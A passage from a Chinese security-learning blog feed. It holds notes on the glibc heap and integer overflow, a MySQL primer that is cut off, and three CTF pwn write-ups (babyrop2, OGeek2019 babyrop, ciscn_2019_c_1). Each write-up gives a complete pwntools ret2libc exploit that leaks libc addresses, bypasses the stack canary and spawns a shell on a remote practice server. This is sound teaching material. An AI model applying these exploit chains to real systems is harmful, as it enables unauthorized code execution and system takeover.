class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p><strong>在主线程释放内存后</strong>，我们从下面的输出可以看出，其对应的 arena 并没有进行回收，而是交由 glibc 来进行管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><blockquote><p>就是意味着你虽然在程序里面加入了释放这段堆空间的指令，但是实际上，这段空间没有直接消失，而是交给glibc了，等待下一个的分配</p></blockquote><h2 id="堆的相关结构"><a href="#堆的相关结构" class="headerlink" title="堆的相关结构"></a>堆的相关结构</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><blockquote><p>chunk</p><p>就是最小的</p></blockquote><p>在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中</p><p>并且chunk的结构都是一样的，在内存下面都是一样，只是状态不同会用不同的标识符进行标记</p><p><strong>当一个 chunk 处于已分配状态时，它的物理相邻的下一个 chunk 的 prev_size 字段必然是无效的，故而这个字段就可以被当前这个 chunk 使用</strong></p><p>未完待续…</p>]]></content>
      
      
      <categories>
          
          <category> pwn-堆学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn-堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bjdctf_2020_babyrop2题解</title>
      <link href="/posts/52553.html"/>
      <url>/posts/52553.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111949863.png" alt="1"></p><p>这题有canary保护</p><p>在ida中打开看看</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111949864.png" alt="2"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111949865.png" alt="3"></p><p>这里的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(&quot;%6s&quot;, format);</span><br></pre></td></tr></table></figure><p>有个格式化字符串漏洞</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111949866.png" alt="4"></p><p>这里的read函数有个栈溢出</p><p>所以要想办法通过格式化字符串找到canary</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111949867.png" alt="8"></p><p>又因为这里什么都没有，需要自己构造rop</p><p>进行ret2libc</p><blockquote><p>开始找canary</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111949868.png"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111949869.png" alt="6"></p><p>找到了偏移量为6</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111949870.png" alt="7"></p><p>找到了canary</p><blockquote><p>因为canary一般以00结尾</p></blockquote></blockquote><p>然后根据栈溢出构造ret2libc就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p=remote(&#x27;node5.buuoj.cn&#x27;,25455)</span><br><span class="line">#p=process(&#x27;./bjdctf_2020_babyrop2&#x27;)</span><br><span class="line">elf=ELF(&#x27;./bjdctf_2020_babyrop2&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi=0x400993</span><br><span class="line">ret=0x4005f9</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">main_addr=elf.symbols[&#x27;main&#x27;]</span><br><span class="line">vuln_addr=0x400887</span><br><span class="line"></span><br><span class="line">payload1=b&#x27;%7$p&#x27;</span><br><span class="line">p.sendlineafter(b&quot;I&#x27;ll give u some gift to help u!\n&quot;,payload1)</span><br><span class="line">#p.recvuntil(b&#x27;story!\n&#x27;).strip()</span><br><span class="line">p.recvuntil(b&#x27;0x&#x27;)</span><br><span class="line">canary = int(p.recv(16),16)</span><br><span class="line">log.success(hex(canary))</span><br><span class="line"></span><br><span class="line">payload2=b&#x27;a&#x27;*0x18+p64(canary)</span><br><span class="line">payload2+=p64(ret)</span><br><span class="line">payload2+=p64(pop_rdi)</span><br><span class="line">payload2+=p64(puts_got)</span><br><span class="line">payload2+=p64(puts_plt)</span><br><span class="line">payload2+=p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;story!\n&#x27;).strip()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">#p.recvuntil(b&#x27;\n&#x27;)</span><br><span class="line">puts_addr=u64(p.recv(6).strip().ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">base_addr=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system_addr=base_addr+libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh=base_addr+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;story!&#x27;).strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3=b&#x27;a&#x27;*0x18+p64(canary)</span><br><span class="line">payload3+=p64(ret)</span><br><span class="line">payload3+=p64(pop_rdi)</span><br><span class="line">payload3+=p64(bin_sh)</span><br><span class="line">payload3+=p64(system_addr)</span><br><span class="line">payload3+=p64(main_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn-刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整数溢出</title>
      <link href="/posts/55205.html"/>
      <url>/posts/55205.html</url>
      
        <content type="html"><![CDATA[<h2 id="上界溢出"><a href="#上界溢出" class="headerlink" title="上界溢出"></a>上界溢出</h2><blockquote><p>上界溢出有两种情况，一种是 0x7fff + 1， 另一种是 0xffff + 1</p></blockquote><h2 id="下界溢出"><a href="#下界溢出" class="headerlink" title="下界溢出"></a>下界溢出</h2><blockquote><p>第一种是 sub 0x0000, 1 &#x3D;&#x3D; 0xffff，对于有符号来说 0 - 1 &#x3D;&#x3D; -1 没问题，但是对于无符号来说就成了 0 - 1 &#x3D;&#x3D; 65535。</p><p>第二种是 sub 0x8000, 1 &#x3D;&#x3D; 0x7fff，对于无符号来说是 32768 - 1 &#x3D;&#x3D; 32767 是正确的，但是对于有符号来说就变成了 -32768 - 1 &#x3D; 32767。</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111949678.png" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> pwn-学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[OGeek2019]babyrop</title>
      <link href="/posts/53893.html"/>
      <url>/posts/53893.html</url>
      
        <content type="html"><![CDATA[<p>先看开了什么保护</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959623.png" alt="1"></p><p>可以看到没有canary保护</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959624.png" alt="2"></p><p>主函数在fd&gt;0时会读取数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v2 = sub_804871F(buf);</span><br></pre></td></tr></table></figure><p>来到这个函数里面</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959625.png" alt="3"></p><p>发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( strncmp(buf, s, v1) )</span><br><span class="line">   exit(0);</span><br></pre></td></tr></table></figure><p>这里有个判断，如果s和buf的长度不一样会退出程序</p><p>在开头加上**&#x2F;x00**进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_80487D0(v2);</span><br></pre></td></tr></table></figure><p>函数会根据buf这个char型数组的buf[7]进行传参</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959626.png" alt="4"></p><p>这个函数read的大小更巨buf[7]</p><p>所以buf[7]的字符串的值越大越好 取’&#x2F;xff’</p><p>栈溢出这部分完成后就可以用libc构造ROP完成提权</p><p>完整exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">#p=process(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node5.buuoj.cn&#x27;,25572)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#rop=ROP(pwnfile)</span><br><span class="line">ret=0x08048502</span><br><span class="line">payload=&#x27;\x00&#x27;+&#x27;\xff&#x27;*7</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[&quot;write&quot;]</span><br><span class="line">write_got=elf.got[&quot;write&quot;]</span><br><span class="line">main_addr=0x08048825</span><br><span class="line">p.recvuntil(&quot;Correct\n&quot;)</span><br><span class="line">payload1=b&#x27;a&#x27;*0xe7+b&#x27;a&#x27;*4+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(8)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(hex(write_addr))</span><br><span class="line">libc_base=write_addr-libc.sym[&#x27;write&#x27;]</span><br><span class="line">bin_sh_addr=libc_base+next(libc.search(b&#x27;bin/sh&#x27;))</span><br><span class="line">system_addr=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&quot;Correct\n&quot;)</span><br><span class="line">payload2=b&#x27;a&#x27;*0xe7+b&#x27;a&#x27;*4+p32(system_addr)+p32(0)+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959627.png" alt="6"></p>]]></content>
      
      
      <categories>
          
          <category> pwn-刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2libc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>‘ciscn_2019_c_1题解’</title>
      <link href="/posts/48442.html"/>
      <url>/posts/48442.html</url>
      
        <content type="html"><![CDATA[<p>先看下开了什么保护</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111951984.png" alt="1"></p><p>可以看到只开了NX</p><p>进入ida看看函数</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111951710.png" alt="2"></p><p>主函数没有什么</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111951694.png" alt="3"></p><p>这里有个选择</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111951982.png" alt="4"></p><p>终于，在这个函数里面找到了gets函数，可以实现栈溢出</p><p><strong>注意</strong>：这里输入的值会有个加密的转化，会干扰栈溢出后面有效值覆盖，所以要想办xian法去绕过</p><blockquote><p>if判断里有个strlen函数，strlen的作用是得知字符串的长度，但是遇到’\0‘就会停止，所以我们在构造rop的时候可以在字符串前加上’\00‘来绕过加密</p></blockquote><p>因为没有system bin&#x2F;sh 现成的函数</p><p>现在就可以开始构造ROP</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111951027.png" alt="5"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111951400.png" alt="6"></p><p>因为64位的程序</p><p>所以payload&#x3D;a”偏移量+8”+pop_rid(这是调用的寄存器)+puts_got表的地址+puts_plt地址</p><p>所以可以构造下面的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span><br><span class="line">pwnfile= &#x27;ciscn_2019_c_1&#x27;</span><br><span class="line"></span><br><span class="line">p=remote(&#x27;node5.buuoj.cn&#x27;,27430)</span><br><span class="line">#p = process(&#x27;./ciscn_2019_c_1&#x27;)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">pop_rdi=0x400c83</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">ret=0x4006b9</span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&#x27;choice!\n&#x27;,&#x27;1&#x27;).strip()</span><br><span class="line">payload=b&#x27;\00&#x27;+b&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">#+p64(0x4006b9)</span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main_addr)</span><br><span class="line">p.sendlineafter(b&#x27;Input your Plaintext to be encrypted\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;Ciphertext\n&#x27;).strip()</span><br><span class="line">p.recvuntil(b&#x27;\n&#x27;).strip()</span><br><span class="line">#p.recvuntil(&#x27;Input your choice!\n&#x27;)</span><br><span class="line">#leak_addr=u64(p.recvuntil(&#x27;\n&#x27;)[:-1].strip().ljust(8,&#x27;\0&#x27;))</span><br><span class="line">#puts_addr=u64(r.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))</span><br><span class="line">leak_addr= u64(p.recvline(6).strip().ljust(8,b&#x27;\00&#x27;))</span><br><span class="line"></span><br><span class="line">#leak_addr = u64(p.recvline()[:-1].ljust(8,b&#x27;\0&#x27;))</span><br><span class="line">log.success(&quot;leak_addr:&#123;&#125;&quot;.format((hex)(leak_addr)))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,leak_addr)</span><br><span class="line"></span><br><span class="line">libc_base=leak_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system_addr=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(&quot;libc_base:&#123;&#125;&quot;.format((hex)(libc_base)))</span><br><span class="line">log.success(&quot;system_addr:&#123;&#125;&quot;.format((hex)(system_addr)))</span><br><span class="line">log.success(&quot;bin_sh_addr:&#123;&#125;&quot;.format((hex)(bin_sh_addr)))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,b&#x27;1&#x27;)</span><br><span class="line">payload2=b&#x27;\00&#x27;+b&#x27;a&#x27;*(0x50+7)</span><br><span class="line">#p64(0x4006b9)</span><br><span class="line">#payload2+=p64(pop_rdi)+p64(ret)+p64(ret)</span><br><span class="line">payload2+=p64(ret)+p64(pop_rdi)</span><br><span class="line">payload2+=p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">#p.sendlineafter(b&#x27;Input your Plaintext to be encrypted\n&#x27;,payload2)</span><br><span class="line">p.sendlineafter(b&quot;encrypted\n&quot;,payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;Ciphertext\n&#x27;).strip()</span><br><span class="line">p.recvuntil(b&#x27;\n&#x27;).strip()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>注</strong>：<strong>高版本的Ubuntu要注意堆栈平衡</strong></p><p>这样就可以拿到权限了</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111951751.png" alt="！"></p>]]></content>
      
      
      <categories>
          
          <category> pwn-刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2libc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库</title>
      <link href="/posts/63394.html"/>
      <url>/posts/63394.html</url>
      
        <content type="html"><![CDATA[<h1 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a>数据库连接</h1><p>基本用法</p><blockquote><p>列出所有可用的数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure><p>选择要使用的数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE your_database;</span><br></pre></td></tr></table></figure><p>列出所选数据库中的所有表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW TABLES;</span><br></pre></td></tr></table></figure><p>退出 <strong>mysql&gt;</strong> 命令提示窗口可以使用 <strong>exit</strong> 命令，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; EXIT;</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure><p>或者使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; QUIT;</span><br></pre></td></tr></table></figure></blockquote><h2 id="使用-PHP-脚本连接-MySQL"><a href="#使用-PHP-脚本连接-MySQL" class="headerlink" title="使用 PHP 脚本连接 MySQL"></a>使用 PHP 脚本连接 MySQL</h2><p>PHP 提供了 mysqli_connect() 函数来连接数据库。</p><p>该函数有 6 个参数，在成功链接到 MySQL 后返回连接标识，失败返回 FALSE 。</p><p>语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_connect(host, username, password, dbname,port, socket);</span><br></pre></td></tr></table></figure><p><strong>参数说明：</strong></p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>host</em></td><td align="left">可选。规定主机名或 IP 地址。</td></tr><tr><td align="left"><em>username</em></td><td align="left">可选。规定 MySQL 用户名。</td></tr><tr><td align="left"><em>password</em></td><td align="left">可选。规定 MySQL 密码。</td></tr><tr><td align="left"><em>dbname</em></td><td align="left">可选。规定默认使用的数据库。</td></tr><tr><td align="left"><em>port</em></td><td align="left">可选。规定尝试连接到 MySQL 服务器的端口号。</td></tr><tr><td align="left"><em>socket</em></td><td align="left">可选。规定 socket 或要使用的已命名 pipe。</td></tr></tbody></table><p>你可以使用 PHP 的 mysqli_close() 函数来断开与 MySQL 数据库的链接。</p><p>该函数只有一个参数为 mysqli_connect() 函数创建连接成功后返回的 MySQL 连接标识符。</p><p>创建数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE [IF NOT EXISTS] DATABASE 数据库名;</span><br></pre></td></tr></table></figure><p>删除数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP DATABASE [IF EXISTS] &lt;database_name&gt;;</span><br></pre></td></tr></table></figure><p>选择数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE database_name;</span><br></pre></td></tr></table></figure><h1 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h1><h3 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h3><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">范围（有符号）</th><th align="left">范围（无符号）</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">TINYINT</td><td align="left">1 Bytes</td><td align="left">(-128，127)</td><td align="left">(0，255)</td><td align="left">小整数值</td></tr><tr><td align="left">SMALLINT</td><td align="left">2 Bytes</td><td align="left">(-32 768，32 767)</td><td align="left">(0，65 535)</td><td align="left">大整数值</td></tr><tr><td align="left">MEDIUMINT</td><td align="left">3 Bytes</td><td align="left">(-8 388 608，8 388 607)</td><td align="left">(0，16 777 215)</td><td align="left">大整数值</td></tr><tr><td align="left">INT或INTEGER</td><td align="left">4 Bytes</td><td align="left">(-2 147 483 648，2 147 483 647)</td><td align="left">(0，4 294 967 295)</td><td align="left">大整数值</td></tr><tr><td align="left">BIGINT</td><td align="left">8 Bytes</td><td align="left">(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</td><td align="left">(0，18 446 744 073 709 551 615)</td><td align="left">极大整数值</td></tr><tr><td align="left">FLOAT</td><td align="left">4 Bytes</td><td align="left">(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</td><td align="left">0，(1.175 494 351 E-38，3.402 823 466 E+38)</td><td align="left">单精度 浮点数值</td></tr><tr><td align="left">DOUBLE</td><td align="left">8 Bytes</td><td align="left">(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td align="left">0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td align="left">双精度 浮点数值</td></tr><tr><td align="left">DECIMAL</td><td align="left">对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td><td align="left">依赖于M和D的值</td><td align="left">依赖于M和D的值</td><td align="left">小数值</td></tr></tbody></table><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">CHAR</td><td align="left">0-255 bytes</td><td align="left">定长字符串</td></tr><tr><td align="left">VARCHAR</td><td align="left">0-65535 bytes</td><td align="left">变长字符串</td></tr><tr><td align="left">TINYBLOB</td><td align="left">0-255 bytes</td><td align="left">不超过 255 个字符的二进制字符串</td></tr><tr><td align="left">TINYTEXT</td><td align="left">0-255 bytes</td><td align="left">短文本字符串</td></tr><tr><td align="left">BLOB</td><td align="left">0-65 535 bytes</td><td align="left">二进制形式的长文本数据</td></tr><tr><td align="left">TEXT</td><td align="left">0-65 535 bytes</td><td align="left">长文本数据</td></tr><tr><td align="left">MEDIUMBLOB</td><td align="left">0-16 777 215 bytes</td><td align="left">二进制形式的中等长度文本数据</td></tr><tr><td align="left">MEDIUMTEXT</td><td align="left">0-16 777 215 bytes</td><td align="left">中等长度文本数据</td></tr><tr><td align="left">LONGBLOB</td><td align="left">0-4 294 967 295 bytes</td><td align="left">二进制形式的极大文本数据</td></tr><tr><td align="left">LONGTEXT</td><td align="left">0-4 294 967 295 bytes</td><td 